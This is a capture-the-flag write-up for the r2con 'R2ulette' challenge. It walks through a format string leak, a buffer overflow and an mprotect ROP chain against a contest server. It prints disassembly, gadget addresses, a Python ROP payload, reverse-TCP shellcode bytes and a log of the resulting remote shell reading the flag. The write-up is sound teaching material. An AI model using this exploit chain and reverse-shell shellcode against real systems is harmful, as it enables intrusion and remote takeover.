# Solution for the challenge R2ulette [400pts]

## Prelude

The "r2ulette" challenges was in a serie of three challenge with differents levels of difficulty. This write-up aims to present our solution for the hardest one.

For this challenge we are given two elements:
- The port and the IP address of a remote server : 46.101.225.237 7878
- The binary executed by the server : r2ulette_f00c874650eea57c6a43550a2483b24e

## Playing with the server
To understand what's the purpose of the challenge, let's start by playing around with the server:
```
$ nc 46.101.225.237 7878
                   .------.
.------.           |A .   |
|A_  _ |    .------; / \  |
|( \/ )|-----. _   |(_,_) |
| \  / | /\  |( )  |  I  A|
|  \/ A|/  \ |_x_) |------'
`-----+'\  / | Y  A|
      |  \/ A|-----'
      `------'
Interested in playing R2ulette? Win playing our Free Roulette game today and go build your own theme park, with blackjack and hookers!

Pick a number (0 - 100), and good luck!: 1
Your got:  1
 Bad Luck, you are not the winner
Pick a number (0 - 100), and good luck!: %llx
Your got:  7ffe8b5b9230
 Bad Luck, you are not the winner
```
As show in the capture, we quickly understand that the executable is affected by a format string vulnerability.

## Analysis of the binary
In this challenge we are given a statically compiled 64-bits ELF executable:
```
$ file r2ulette_f00c874650eea57c6a43550a2483b24e
r2ulette_f00c874650eea57c6a43550a2483b24e: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=a8dbdd2e7a7af81e569be8a8f174432701f8875b, stripped

$ rabin2 -I r2ulette_f00c874650eea57c6a43550a2483b24e
Warning: Cannot initialize dynamic strings
arch     x86
baddr    0x400000
binsz    847033
bintype  elf
bits     64
canary   false
class    ELF64
crypto   false
endian   little
havecode true
lang     c
linenum  false
lsyms    false
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   false
rpath    NONE
static   true
stripped true
subsys   linux
va       true
```

Even if the `rabin2` command shows that the binary was not compiled with the stack canary, it is pretty simple to see from the prelude of the function that stack canary is present (from `fs:[0x28]`).
```
[0x00400ccc]> pd 10 @ main
            ;-- main:
            0x00400ccc      55             push rbp
            0x00400ccd      4889e5         mov rbp, rsp
            0x00400cd0      4883ec50       sub rsp, 0x50
            0x00400cd4      897dbc         mov dword [rbp - 0x44], edi
            0x00400cd7      488975b0       mov qword [rbp - 0x50], rsi
            0x00400cdb      64488b042528.  mov rax, qword fs:[0x28]      --> position of the canary (Linux x64)
            0x00400ce4      488945f8       mov qword [rbp - 8], rax
            0x00400ce8      31c0           xor eax, eax
```

## Reverse of the binary
After having played with the binary, we can already suppose that the executable does the following things:
- Start a listening socket and wait for the client connection
- Fork when a connection is receive in order to handle the client connection
- Execute the game function

As we already know what to look for, we start by looking for the string used by the executable, and retrieve the function associated:
```
[0x00400ccc]> iz~Pick
010 0x000a2c20 0x004a2c20  41  42 (.rodata) ascii Pick a number (0 - 100), and good luck!:
[0x00400ccc]> axF 0x004a2c20
Finding references of flags matching '0x004a2c20'...
[0x006cfdb0-0x006cfe48] (nofunc) 0x400b5f [DATA] mov edi, str.Pick_a_number__0___100___and_good_luck_:
Macro 'findstref' removed.
[0x00400890]> s 0x400b5f
[0x00400b5f]> aaa
[0x00400b5f]> sf.
[0x00400ac3]> pd 3
/ (fcn) sub.Interested_in_playing_R2ulette__Win_playing_our_Free_Roulette_game_today_and_go_build_your_own_theme_park__with_blackjack_and_hookers_ac3 521
|   sub.Interested_in_playing_R2ulette__Win_playing_our_Free_Roulette_game_today_and_go_build_your_own_theme_park__with_blackjack_and_hookers_ac3 ();
|           ; var unsigned int local_11ch @ rbp-0x11c
|           ; var unsigned int local_118h @ rbp-0x118
|           ; var int local_110h @ rbp-0x110
|           ; var int local_8h @ rbp-0x8
|           ; CALL XREF from main (0x400e26)
|           0x00400ac3      55             push rbp
|           0x00400ac4      4889e5         mov rbp, rsp
|           0x00400ac7      4881ec200100.  sub rsp, 0x120
```

The analysis of the function shows that the size (0x264) of the buffer used to store the client input is smaller than the length parameter (0x400) passed to the `recv` function:
```
|           0x00400b78      488b15e1eb2c.  mov rdx, qword [0x006cf760] ; fd ; [0x6cf760:8]=0
|           0x00400b7f      488d85f0feff.  lea rax, [input_buffer]
|           0x00400b86      be00040000     mov esi, 0x400              ; 1024
|           0x00400b8b      4889c7         mov rdi, rax
|           0x00400b8e      e83d020100     call recv
```

## Exploitation
As the binary is compiled with NX protection, we have to build a ROP chain, we chose to do :
- Stage 1 (format string exploitation):
  - Retrieve the stack cookie
  - Retrieve the address of the input buffer
- Stage 2 (buffer overflow):
  - Execute `mprotect` to allow the execution of our shellcode
  - Start the execution of the shellcode (reverse tcp)

In order to do that, we had to find the address of the libc `mprotect` function (syscall 0xa on Linux x64) in the binary; we used the following `r2` command:
```
[0x00400890]> pd 2 @@/c mov eax, 0xa
            0x00441e50      b80a000000     mov eax, 0xa   -> mprotect start address
            0x00441e55      0f05           syscall
0x00441e50   # 5: mov eax, 0xa
        :   0x00450585      b80a000000     mov eax, 0xa
        `=< 0x0045058a      e991fcffff     jmp 0x450220
0x00450585   # 5: mov eax, 0xa
            0x0045b846      b80a000000     mov eax, 0xa
            0x0045b84b      48c745800000.  mov qword [rbp - 0x80], 0
```

Then we looked for our needed gadgets:
```
[0x00441e50]> /R pop rdi
  0x00401946                 5f  pop rdi
  0x00401947                 c3  ret
[0x00441e50]> /R pop rsi
  0x00401a67                 5e  pop rsi
  0x00401a68                 c3  ret
[0x00441e50]> /R pop rdx
  0x00444836                 5a  pop rdx
  0x00444837                 c3  ret
```

Since the function runs in an infinite loop, we have to exit in order to trigger the buffer overflow, to do this we can send the command `q` to the server:
```
[0x00400bc1]> pd 10
|           0x00400bc1      488b85e8feff.  mov rax, qword [buffer_end_ptr]
|           0x00400bc8      c60000         mov byte [rax], 0
|           0x00400bcb      0fb685f0feff.  movzx eax, byte [input_buffer]
|           0x00400bd2      3c71           cmp al, 0x71                ; 'q' ; 113
|       ,=< 0x00400bd4      0f84b7000000   je 0x400c91
```

The final payload is the following:
```python
payload_exploit+= p64(0x401946)                                 # POP RDI
payload_exploit+= p64(STRING_BEGINNING & 0xfffffffffffff000)    # Arg0 = page_start(@shellcode)
payload_exploit+= p64(0x401a67)                                 # POP RSI
payload_exploit+= p64(0x1000)                                   # Arg1 = 0x1000 (std page size)
payload_exploit+= p64(0x444836)                                 # POP RDX
payload_exploit+= p64(0x7)                                      # Arg2 = PROT_READ | PROT_WRITE | PROT_EXEC
payload_exploit+= p64(0x441E50)                                 # @gadget_syscall_mprotect
payload_exploit+= p64(STRING_BEGINNING + 20)                    # Return to shellcode, with some security, just in case
payload_exploit+= p64(STRING_BEGINNING + 20)                    # Double the return address, just in case
```

Once we start our script, we receive a connection and get the flag:
```
root @ kwjms ~ # python solve.py
[+] Opening connection to 46.101.225.237 on port 7878: Done
[*] Switching to interactive mode
Your got:  \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1�H1\xffH1�H1�M1�j_j^j\x06Zj)X\x0f\x05I\x89�H1�M1�AR�$f�D$\x11\�D$\x04>�l\xa0H\x89�jZAP_j*X\x0f\x05H1�j^H\xff�j!X\x0f\x05u�H1�WW^ZH\xbf//bin/shH�WT_j;X\x0f\x05aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Bad Luck, you are not the winner
Pick a number (0 - 100), and good luck!: $ q

$
```

```
connect to [xxxxxx] from (UNKNOWN) [46.101.225.237] 60338
ls -la
total 844
drwxr-xr-x 1 ctf  ctf    4096 Sep  7 10:38 .
drwxr-xr-x 1 root root   4096 Sep  7 10:38 ..
-r-------- 1 ctf  ctf      39 Sep  6 18:02 flag.txt
---x------ 1 ctf  ctf  849024 Sep  7 10:38 r2ulette
cat flag.txt
r2con{_R0p_&_R0ll!R0p1ng_3v3r1thing_!}
```

__First blood baby!__
